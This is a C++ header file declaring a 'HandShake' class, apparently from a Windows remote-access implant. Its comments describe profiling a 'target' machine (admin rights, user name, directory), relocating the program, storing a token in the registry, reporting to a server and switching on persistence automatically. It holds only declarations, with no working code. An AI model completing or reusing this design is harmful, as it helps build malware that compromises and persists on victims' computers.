#ifndef HANDSHAKE_H
#define HANDSHAKE_H

#include "../inc/master.h"

using namespace  std;


class HandShake
{

/*
Collect the first information unavailable to the program and manages the client's first actions  .
Sends the primary information when the client connects.
*/
    public:

        HandShake();

        ////Collects information from the machine:   
        BOOL setIsAdmin(); //look if admin or not and return false or true.
        wstring setNameUser(); // Return name user of target 
        wstring setCurrentDirectory(); // return current directory;
        wstring setLocationProg(); //set localisation prog after remove according to rights
        void setSock(int sock); //Set socket
        
        string getTokenOrSetTokenInRegistry();
        string generateToken(const int token_size); //Generate tokken and set in a_token.

        //---------------------------------------------------------------------
        //Network:
    

        //---------------------------------------------------------------------
        void beforeHandShake(); //manage actions before startHandShake and set a_location_prog
        void startHandShake(); //Sends the first necessary information to the server and if MOD_HANDSHAKE_AUTO_PERSISTENCE = True then persistence is activated automatically. 

        //---------------------------------------------------------------------
        
        BOOL getIsAdmin();//getter of is_admin
        wstring getPathProg();// getter see location of prog.
        wstring getNameUser();
        string getToken();
        //---------------------------------------------------------------------
     

    private:
        BOOL a_is_admin=false;// check if target is admin or not.
       // string a_name_prog;
        wstring a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
        wstring a_current_directory; //Location of programme execute.
        wstring a_path_prog; //Location of the program once moved or not moved
        string a_token;
    
        int a_sock;
        const int a_size_token = 24;
};

#endif